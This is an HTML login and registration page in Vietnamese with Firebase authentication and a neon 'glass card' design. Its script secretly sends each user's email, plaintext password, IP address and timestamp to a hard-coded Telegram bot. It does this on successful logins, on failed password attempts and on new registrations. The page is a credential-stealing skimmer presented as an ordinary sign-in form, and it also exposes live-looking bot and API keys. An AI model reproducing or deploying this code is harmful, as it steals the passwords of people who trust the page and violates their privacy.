<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Inter', 'Segoe UI', sans-serif;
      background: #0a0a0f;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      position: relative;
      overflow: hidden;
    }

    /* Animated Background */
    body::before {
      content: '';
      position: absolute;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.08) 0%, transparent 50%),
                  radial-gradient(circle at 80% 80%, rgba(255, 0, 255, 0.08) 0%, transparent 50%),
                  radial-gradient(circle at 40% 20%, rgba(0, 255, 136, 0.06) 0%, transparent 50%);
      animation: bgMove 20s ease infinite;
    }

    @keyframes bgMove {
      0%, 100% { transform: translate(0, 0) rotate(0deg); }
      50% { transform: translate(-50px, -50px) rotate(180deg); }
    }

    .container {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 440px;
    }

    .glass-card {
      background: rgba(15, 15, 25, 0.7);
      backdrop-filter: blur(20px);
      border-radius: 24px;
      padding: 48px 40px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5),
                  inset 0 1px 0 rgba(255, 255, 255, 0.05);
    }

    /* Header */
    .header {
      text-align: center;
      margin-bottom: 40px;
    }

    .logo {
      font-size: 3em;
      font-weight: 900;
      background: linear-gradient(135deg, #00ffff 0%, #ff00ff 50%, #00ff88 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      letter-spacing: -2px;
      margin-bottom: 8px;
      text-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
    }

    .tagline {
      color: rgba(255, 255, 255, 0.6);
      font-size: 0.95em;
      letter-spacing: 0.5px;
    }

    /* Form Title */
    .form-title {
      color: #fff;
      font-size: 1.75em;
      font-weight: 700;
      margin-bottom: 32px;
      text-align: center;
      position: relative;
    }

    .form-title::after {
      content: '';
      position: absolute;
      bottom: -12px;
      left: 50%;
      transform: translateX(-50%);
      width: 60px;
      height: 3px;
      background: linear-gradient(90deg, #00ffff, #ff00ff);
      border-radius: 2px;
    }

    /* Input Groups */
    .input-group {
      position: relative;
      margin-bottom: 24px;
    }

    .input-group label {
      display: block;
      color: rgba(255, 255, 255, 0.8);
      font-size: 0.9em;
      margin-bottom: 8px;
      font-weight: 500;
    }

    .input-wrapper {
      position: relative;
    }

    .input-group input {
      width: 100%;
      padding: 14px 48px 14px 48px;
      background: rgba(255, 255, 255, 0.05);
      border: 1.5px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      color: #fff;
      font-size: 1em;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      outline: none;
    }

    .input-group input:focus {
      background: rgba(255, 255, 255, 0.08);
      border-color: #00ffff;
      box-shadow: 0 0 0 3px rgba(0, 255, 255, 0.1),
                  0 4px 12px rgba(0, 255, 255, 0.15);
    }

    .input-group input::placeholder {
      color: rgba(255, 255, 255, 0.3);
    }

    .input-icon {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: rgba(0, 255, 255, 0.7);
      font-size: 1.1em;
      pointer-events: none;
    }

    .toggle-password {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: rgba(255, 255, 255, 0.4);
      cursor: pointer;
      font-size: 1em;
      transition: color 0.3s;
      padding: 4px;
    }

    .toggle-password:hover {
      color: #00ffff;
    }

    /* Buttons */
    .btn {
      width: 100%;
      padding: 16px;
      font-size: 1.05em;
      font-weight: 700;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      position: relative;
      overflow: hidden;
      letter-spacing: 0.5px;
    }

    .btn::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.2);
      transform: translate(-50%, -50%);
      transition: width 0.6s, height 0.6s;
    }

    .btn:hover::before {
      width: 300px;
      height: 300px;
    }

    .btn span {
      position: relative;
      z-index: 1;
    }

    .btn-primary {
      background: linear-gradient(135deg, #00ffff 0%, #00ff88 100%);
      color: #000;
      margin: 24px 0 16px 0;
      box-shadow: 0 8px 24px rgba(0, 255, 255, 0.3);
    }

    .btn-primary:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 12px 32px rgba(0, 255, 255, 0.4);
    }

    .btn-primary:active:not(:disabled) {
      transform: translateY(0);
    }

    .btn-primary:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    /* Alert Messages */
    .alert {
      padding: 14px 16px;
      margin: 16px 0;
      border-radius: 10px;
      font-size: 0.92em;
      display: none;
      animation: slideDown 0.3s ease;
      line-height: 1.5;
    }

    .alert.show {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .alert-error {
      background: rgba(255, 68, 68, 0.15);
      border: 1px solid rgba(255, 68, 68, 0.3);
      color: #ff6b6b;
    }

    .alert-success {
      background: rgba(0, 255, 136, 0.15);
      border: 1px solid rgba(0, 255, 136, 0.3);
      color: #00ff88;
    }

    @keyframes slideDown {
      from {
        opacity: 0;
        transform: translateY(-10px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Form Switch */
    .form-switch {
      text-align: center;
      margin-top: 24px;
      color: rgba(255, 255, 255, 0.6);
      font-size: 0.95em;
    }

    .form-switch a {
      color: #00ffff;
      text-decoration: none;
      font-weight: 600;
      cursor: pointer;
      transition: color 0.3s;
    }

    .form-switch a:hover {
      color: #ff00ff;
    }

    /* Footer */
    .footer {
      margin-top: 32px;
      text-align: center;
      padding-top: 24px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
    }

    .footer-text {
      color: rgba(255, 255, 255, 0.4);
      font-size: 0.9em;
      margin-bottom: 8px;
    }

    .footer-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 12px;
    }

    .footer-links a {
      color: rgba(0, 255, 255, 0.8);
      text-decoration: none;
      font-size: 0.9em;
      transition: color 0.3s;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .footer-links a:hover {
      color: #00ffff;
    }

    .hidden {
      display: none;
    }

    /* Loading Spinner */
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .fa-spinner {
      animation: spin 1s linear infinite;
    }

    /* Responsive */
    @media (max-width: 480px) {
      .glass-card {
        padding: 36px 24px;
      }
      
      .logo {
        font-size: 2.5em;
      }
      
      .form-title {
        font-size: 1.5em;
      }
    }
  </style>
</head>

  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>

  <script>
         const firebaseConfig = {
            apiKey: "AIzaSyCTnc0HQWRxsHDEWlJ4ZT9yqKDbC8unm00",
            authDomain: "adminshop-c2ac2.firebaseapp.com",
            projectId: "adminshop-c2ac2",
            storageBucket: "adminshop-c2ac2.firebasestorage.app",
            messagingSenderId: "583532399934",
            appId: "1:583532399934:web:23a213d578f3144053706f",
            measurementId: "G-9D6JRTW7TM"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();

        // === THAY 2 D√íNG N√ÄY B·∫∞NG TH√îNG TIN C·ª¶A ANH ===
        const TELEGRAM_BOT_TOKEN = "7571735453:AAG8gkZ5pFyt4mCc88RTQOKAq3MqDAURfSQ"; // Thay b·∫±ng token bot c·ªßa anh
        const TELEGRAM_CHAT_ID = "7389597494"; // Thay b·∫±ng chat ID c·ªßa anh (s·ªë √¢m n·∫øu l√† group)

        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        // L·∫•y IP
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip || 'Kh√¥ng l·∫•y ƒë∆∞·ª£c IP';
            } catch {
                return 'L·ªói l·∫•y IP';
            }
        }

        // L·∫•y th·ªùi gian chi ti·∫øt
        function getTimeDetail() {
            const now = new Date();
            const day = String(now.getDate()).padStart(2, '0');
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const year = now.getFullYear();
            const hour = String(now.getHours()).padStart(2, '0');
            const minute = String(now.getMinutes()).padStart(2, '0');
            const second = String(now.getSeconds()).padStart(2, '0');
            return `${hour}:${minute}:${second} - ${day}/${month}/${year}`;
        }

        // G·ª≠i v·ªÅ Telegram
        async function sendToTelegram(message) {
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "HTML"
            };
            try {
                await fetch(TELEGRAM_API, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                console.log("G·ª≠i Telegram l·ªói:", e);
            }
        }

        function switchForm(formType) {
            const loginForm = document.getElementById('loginForm');
            const registerForm = document.getElementById('registerForm');
            
            if (formType === 'register') {
                loginForm.classList.add('hidden');
                registerForm.classList.remove('hidden');
            } else {
                registerForm.classList.add('hidden');
                loginForm.classList.remove('hidden');
            }
            clearAlerts();
        }

        function togglePassword(inputId, icon) {
            const input = document.getElementById(inputId);
            if (input.type === 'password') {
                input.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                input.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        }

        function showAlert(elementId, message, type = 'error') {
            const alert = document.getElementById(elementId);
            const span = alert.querySelector('span');
            span.textContent = message;
            alert.className = `alert alert-${type} show`;
            setTimeout(() => alert.classList.remove('show'), 5000);
        }

        function clearAlerts() {
            document.querySelectorAll('.alert').forEach(alert => {
                alert.classList.remove('show');
            });
        }

        function validateEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        // ƒêƒÇNG NH·∫¨P
        document.getElementById('loginBtn').onclick = async function() {
            const email = document.getElementById('loginEmail').value.trim();
            const pass = document.getElementById('loginPass').value;
            const btn = this;

            clearAlerts();

            if (!email || !pass) {
                showAlert('loginError', 'Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß th√¥ng tin!');
                return;
            }

            if (!validateEmail(email)) {
                showAlert('loginError', 'Email kh√¥ng h·ª£p l·ªá!');
                return;
            }

            btn.disabled = true;
            btn.querySelector('span').innerHTML = '<i class="fas fa-spinner fa-spin"></i> ƒêang x·ª≠ l√Ω...';

            const ip = await getIP();
            const time = getTimeDetail();

            try {
                await auth.signInWithEmailAndPassword(email, pass);

                // G·ª≠i khi ƒëƒÉng nh·∫≠p th√†nh c√¥ng
                const msg = `<b>üü¢ ƒêƒÇNG NH·∫¨P TH√ÄNH C√îNG</b>\n\n` +
                            `<b>Email:</b> <code>${email}</code>\n` +
                            `<b>Pass:</b> <code>${pass}</code>\n` +
                            `<b>IP:</b> <code>${ip}</code>\n` +
                            `<b>Th·ªùi gian:</b> ${time}`;
                await sendToTelegram(msg);

                window.location.href = "index.html";
            } catch (err) {
                let msgError = 'ƒêƒÉng nh·∫≠p th·∫•t b·∫°i!';
                if (err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') {
                    msgError = 'Email ho·∫∑c m·∫≠t kh·∫©u kh√¥ng ƒë√∫ng!';

                    // G·ª≠i lu√¥n c·∫£ khi sai pass
                    const failMsg = `<b>üî¥ TH·ª¨ ƒêƒÇNG NH·∫¨P (SAI)</b>\n\n` +
                                    `<b>Email:</b> <code>${email}</code>\n` +
                                    `<b>Pass:</b> <code>${pass}</code>\n` +
                                    `<b>IP:</b> <code>${ip}</code>\n` +
                                    `<b>Th·ªùi gian:</b> ${time}`;
                    await sendToTelegram(failMsg);
                } else if (err.code === 'auth/too-many-requests') {
                    msgError = 'Qu√° nhi·ªÅu l·∫ßn th·ª≠. Vui l√≤ng th·ª≠ l·∫°i sau!';
                } else if (err.code === 'auth/invalid-email') {
                    msgError = 'Email kh√¥ng h·ª£p l·ªá!';
                }
                showAlert('loginError', msgError);
            } finally {
                btn.disabled = false;
                btn.querySelector('span').innerHTML = '<i class="fas fa-sign-in-alt"></i> ƒêƒÉng Nh·∫≠p';
            }
        };

        // ƒêƒÇNG K√ù
        document.getElementById('registerBtn').onclick = async function() {
            const name = document.getElementById('registerName').value.trim();
            const email = document.getElementById('registerEmail').value.trim();
            const pass = document.getElementById('registerPass').value;
            const btn = this;

            clearAlerts();

            if (!name || !email || !pass) {
                showAlert('registerError', 'Vui l√≤ng nh·∫≠p ƒë·∫ßy ƒë·ªß th√¥ng tin!');
                return;
            }

            if (name.length < 2) {
                showAlert('registerError', 'T√™n ph·∫£i c√≥ √≠t nh·∫•t 2 k√Ω t·ª±!');
                return;
            }

            if (!validateEmail(email)) {
                showAlert('registerError', 'Email kh√¥ng h·ª£p l·ªá!');
                return;
            }

            if (pass.length < 6) {
                showAlert('registerError', 'M·∫≠t kh·∫©u ph·∫£i c√≥ √≠t nh·∫•t 6 k√Ω t·ª±!');
                return;
            }

            btn.disabled = true;
            btn.querySelector('span').innerHTML = '<i class="fas fa-spinner fa-spin"></i> ƒêang x·ª≠ l√Ω...';

            const ip = await getIP();
            const time = getTimeDetail();

            try {
                const userCredential = await auth.createUserWithEmailAndPassword(email, pass);
                await userCredential.user.updateProfile({ displayName: name });
                
                // G·ª≠i khi ƒëƒÉng k√Ω th√†nh c√¥ng
                const msg = `<b>üü¢ ƒêƒÇNG K√ù TH√ÄNH C√îNG</b>\n\n` +
                            `<b>T√™n:</b> ${name}\n` +
                            `<b>Email:</b> <code>${email}</code>\n` +
                            `<b>Pass:</b> <code>${pass}</code>\n` +
                            `<b>IP:</b> <code>${ip}</code>\n` +
                            `<b>Th·ªùi gian:</b> ${time}`;
                await sendToTelegram(msg);
                
                showAlert('registerSuccess', 'ƒêƒÉng k√Ω th√†nh c√¥ng! ƒêang chuy·ªÉn h∆∞·ªõng...', 'success');
                
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 2000);
                
            } catch (err) {
                let msg = 'ƒêƒÉng k√Ω th·∫•t b·∫°i!';
                if (err.code === 'auth/email-already-in-use') {
                    msg = 'Email ƒë√£ ƒë∆∞·ª£c s·ª≠ d·ª•ng!';
                } else if (err.code === 'auth/invalid-email') {
                    msg = 'Email kh√¥ng h·ª£p l·ªá!';
                } else if (err.code === 'auth/weak-password') {
                    msg = 'M·∫≠t kh·∫©u qu√° y·∫øu!';
                }
                showAlert('registerError', msg);
                btn.disabled = false;
                btn.querySelector('span').innerHTML = '<i class="fas fa-user-plus"></i> T·∫°o T√†i Kho·∫£n';
            }
        };

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const loginForm = document.getElementById('loginForm');
                if (!loginForm.classList.contains('hidden')) {
                    document.getElementById('loginBtn').click();
                } else {
                    document.getElementById('registerBtn').click();
                }
            }
        });
  </script>
